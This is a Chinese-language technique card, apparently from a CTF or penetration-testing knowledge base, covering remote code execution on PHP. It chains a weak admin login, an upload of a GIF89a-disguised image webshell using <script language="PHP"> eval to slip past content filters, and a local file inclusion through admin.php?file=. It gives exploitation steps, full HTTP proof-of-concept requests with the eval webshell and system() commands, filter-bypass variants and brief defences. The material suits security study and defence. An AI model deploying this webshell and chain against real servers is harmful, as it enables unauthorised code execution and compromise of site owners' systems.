---
id: web-php-file-inclusion-upload-jpg-script-tag-lfi
title: 后台头像上传 + admin.php?file= 包含：GIF89a 头 + <script language="PHP"> 绕内容检测，图片后缀经 LFI 解析执行
type: scenario
domain: web
path: web/php/file-inclusion
technique: upload-image-php-script-tag-lfi-rce
tags:
- php
- file-upload
- lfi
- bypass
- webshell
- nginx
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-24
  verified_at: '2026-11-08T13:32:30+08:00'
  notes: 已对照原文核对：GIF89a+<script language=PHP> eval上传(图34,文件名shell.php.jpg)、admin.php?file=包含渲染GIF89a(图36)、a=system('ls')列目录(图37)全支撑，nginx/1.20.2(图35)为目标环境非受影响版本故affected_versions不设；dedup_review对htaccess-auto-prepend链路差异成立；卡无sources字段；未验证点：PoC未执行
url: /docs/web/php/file-inclusion/web-php-file-inclusion-upload-jpg-script-tag-lfi/
draft: false
kb_aliases:
- 图片马 + 文件包含
- script language php 绕过
- jpg 上传后包含执行
- 上传图片 LFI getshell
---

## 一句话结论

上传点只允许 `.jpg` 且检查文件内容里的 `<?php`，但服务器仍能通过 `admin.php?file=uploads/xxx.jpg` 把上传文件当 PHP 包含执行；用 `GIF89a` 伪装图片、用 `<script language="PHP">` 代替 `<?php` 即可通过内容检测，包含后执行 `eval($_POST['a'])` 拿到命令执行。

## 原理

- 上传侧同时校验扩展名与内容，但两者是独立判断：`shell.php.jpg` 的最终扩展名是 `.jpg`，内容检查只看是否含被禁标签。
- `<script language="PHP"> ... </script>` 是 PHP 早期支持的标签形式，与 `<?php` 语义相同；黑名单只匹配 `<?php`/`<?=` 时不会命中，但 PHP 解析器仍会执行其中的代码（仅 PHP 5.x 及更早支持，PHP 7 起移除）。
- 文件落地在 `uploads/`，nginx 不会把 `.jpg` 交给 PHP-FPM 执行，直接访问只会 405/静态返回，所以上传本身不构成 RCE。
- 真正的执行点是 `admin.php?file=uploads/1.jpg`：`include($_GET['file'])` 不关心扩展名，把文件内容当 PHP 解析，于是图片马中的代码被执行。
- 前置的弱口令 `admin/password` 只是进入后台上传点的门槛；登录表单在前端 base64 编码账号密码，不构成额外防护。

## 触发条件

- 存在「仅 jpg + 内容黑名单」的上传点，且上传目录路径可预测/可回显。
- 同站存在 `include`/`require` 用户可控参数（本例 `admin.php?file=`），且未限制目录/协议。
- PHP 版本仍支持 `<script language="PHP">` 标签（PHP 5.x）。

## 利用步骤

1. 用 `admin/password` 登录后台（表单会把用户名密码 base64 后提交）。
2. 构造图片马：文件头 `GIF89a`，正文用 `<script language="PHP"> @eval($_POST["a"]);</script>`，文件名 `shell.php.jpg`，Content-Type `image/jpeg`。
3. 上传成功，响应回显路径 `uploads/shell.php.jpg`。
4. 直接访问该路径得到 405（nginx 不解析 jpg），确认需要包含。
5. 请求 `admin.php?file=uploads/shell.php.jpg`，POST `a=system("ls");`，命令输出随页面返回。
6. 读取 flag。

## PoC

上传请求体：

```http
------boundary
Content-Disposition: form-data; name="avatar"; filename="shell.php.jpg"
Content-Type: image/jpeg

GIF89a
<script language="PHP"> @eval($_POST["a"]);</script>
------boundary--
```

包含执行：

```http
POST /admin.php?file=uploads/shell.php.jpg HTTP/1.1
Content-Type: application/x-www-form-urlencoded

a=system("cat /flag");
```

## 变体与关联

- 标签变体：`<?=`（short_open_tag 开启时）、`<% %>`（asp_tags）、大小写混写、`<script language=php>` 去引号。
- 图片头变体：`GIF89a`、`\xFF\xD8\xFF`（JPEG）、`\x89PNG`。
- 若无 LFI，可尝试 `.phtml`/`.php5` 解析、`.htaccess`、二次渲染绕过，见 [[web-generic-file-upload-image-render-payload-survival]]。
- LFI 侧可升级为伪协议/日志包含，见 [[web-php-file-inclusion]] 同目录其他卡。

## 检测与防御

- 上传目录禁止 PHP 解析（`location ~ \.php$ { deny all; }`），上传文件重命名并去掉用户可控部分。
- 内容检测用真实图片解码 + 白名单，而非关键字黑名单；升级到 PHP 7+ 移除 `<script language="PHP">`。
- 禁止 `include` 用户可控路径，使用固定映射表；开启 `open_basedir`。
